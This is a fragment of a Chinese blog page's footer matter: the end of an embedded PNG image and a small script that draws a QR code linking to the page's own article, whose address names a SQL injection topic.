6cVpzweuexvFMzcHI/a+HS/xM8w/Uak68NxjIs/DeTZInfu+09gGwg9LT7Gq22x115p6imIRTPHdJ/whTSXmmfIWkvzeFZ+mat9XNlchMftZMfUPtNuA5lFd/wzJ3AP5GfO/XLV/wMAAP//iwzy2gAAAAZJREFUAwBEFJazzEhgAgAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-CallSystemReadOver-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 